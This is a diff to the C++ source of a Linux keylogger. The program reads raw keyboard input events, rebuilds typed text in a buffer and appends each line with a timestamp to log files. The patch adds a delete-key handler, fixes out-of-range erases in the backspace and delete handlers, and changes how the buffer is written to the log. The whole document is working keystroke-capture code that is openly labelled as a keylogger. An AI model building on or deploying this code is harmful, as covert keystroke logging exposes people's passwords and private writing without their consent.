@@ -25,6 +25,7 @@ void handle_key(struct keylogger_ctx *);
 void handle_enter(struct keylogger_ctx *);
 void handle_backspace(struct keylogger_ctx *);
 void handle_capslock(struct keylogger_ctx *);
+void handle_delete(struct keylogger_ctx *);
 
 static const std::map<int, struct key_event_handler> handlers{
     { KEY_0, { '0', handle_key } },
@@ -65,41 +66,19 @@ static const std::map<int, struct key_event_handler> handlers{
     { KEY_Z, { 'z', handle_key } },
     { KEY_SPACE, { ' ', handle_key } },
     { KEY_ENTER, { '\0', handle_enter } },
-    { KEY_BACKSPACE, {'\0', handle_backspace } },
-    { KEY_CAPSLOCK, {'\0', handle_capslock } }
-    //{ KEY_C, 'c' }, { KEY_D, 'd' }, { KEY_E, 'e' }, { KEY_F, 'f' },
-    //{ KEY_G, 'g' }, { KEY_H, 'h' }, { KEY_I, 'j' }, { KEY_K, 'k' },
-    //{ KEY_L, 'l' }, { KEY_M, 'm' }, { KEY_N, 'n' }, { KEY_O, 'o' },
-    //{ KEY_P, 'p' }, { KEY_Q, 'q' }, { KEY_R, 'r' }, { KEY_S, 's' },
-    //{ KEY_T, 't' }, { KEY_U, 'u' }, { KEY_V, 'v' }, { KEY_W, 'w' },
+    { KEY_BACKSPACE, { '\0', handle_backspace } },
+    { KEY_CAPSLOCK, { '\0', handle_capslock } },
+    { KEY_DELETE, { '\0', handle_delete } }
     //{ KEY_X, 'x' }, { KEY_Y, 'y' }, { KEY_Z, 'z' }, { KEY_COMMA, ',' },
     //{ KEY_DOT, '.' }, { KEY_MINUS, '-' }, { KEY_SPACE, ' ' }, { KEY_SEMICOLON, ';' },
     //{ KEY_EQUAL, '=' }
 };
 
-/*
- *
-#define KEY_BACKSPACE		14
-#define KEY_TAB			15
-#define KEY_LEFTBRACE		26
-#define KEY_RIGHTBRACE		27
-#define KEY_ENTER		28
-#define KEY_LEFTCTRL		29
-#define KEY_APOSTROPHE		40
-#define KEY_GRAVE		41
-#define KEY_LEFTSHIFT		42
-#define KEY_BACKSLASH		43
-#define KEY_SLASH		53
-#define KEY_RIGHTSHIFT		54
-#define KEY_KPASTERISK		55
-#define KEY_LEFTALT		56
-#define KEY_CAPSLOCK		58
-*/
-
 void handle_key(struct keylogger_ctx *ctx)
 {
     auto key_char = handlers.at(ctx->current_key).key_char;
 
+    // TODO: improve
     if (ctx->is_capslock_on) {
         key_char -= 32;
     }
@@ -116,8 +95,9 @@ void handle_enter(struct keylogger_ctx *ctx)
     std::ofstream log_file{std::string{LOGS_DIRECTORY} + "log_" + date, std::ios::app};
     std::string timestamp{"18:57:02"}; // TODO
 
-    log_file << "[" << timestamp << "] "
-             << ctx->kb_buffer.data() << "\n";
+    log_file << "[" << timestamp << "] ";
+    log_file.write(ctx->kb_buffer.data(), ctx->kb_buffer.size());
+    log_file << "\n";
 
     ctx->kb_buffer.clear();
     ctx->buffer_cursor = 0;
@@ -132,13 +112,23 @@ void handle_capslock(struct keylogger_ctx *ctx)
 
 void handle_delete(struct keylogger_ctx *ctx)
 {
-    ctx->kb_buffer.erase(ctx->kb_buffer.begin() + ctx->buffer_cursor);
+    std::cout << ctx->buffer_cursor << std::endl;
+    std::cout << ctx->kb_buffer.size() << std::endl;
+    if (ctx->buffer_cursor < ctx->kb_buffer.size()) {
+        ctx->kb_buffer.erase(ctx->kb_buffer.begin() + ctx->buffer_cursor--);
+    }
+
     std::cout << __FUNCTION__ << ":" << __LINE__ << std::endl;
 }
 
 void handle_backspace(struct keylogger_ctx *ctx)
 {
-    ctx->kb_buffer.erase(ctx->kb_buffer.begin() + (ctx->buffer_cursor - 1));
+    if (!ctx->kb_buffer.empty()) {
+        ctx->kb_buffer.erase(
+            ctx->kb_buffer.begin() + (--ctx->buffer_cursor)
+        );
+    }
+
     std::cout << __FUNCTION__ << ":" << __LINE__ << std::endl;
 }
 
@@ -165,7 +155,6 @@ int main(int argc, char *argv[])
         while (1) {
             kb_file.read((char *)&ev, sizeof(struct input_event));
 
-            // TODO: backspace
             // TODO: delete
             // TODO: tab
             // TODO: cursors
@@ -176,7 +165,7 @@ int main(int argc, char *argv[])
 
                     ctx.current_key = ev.code;
                     ev_handler.cb(&ctx);
-                } catch(...) {
+                } catch (...) {
                     std::cout << "no event handler for key " << ev.code << std::endl;
                 }
             }
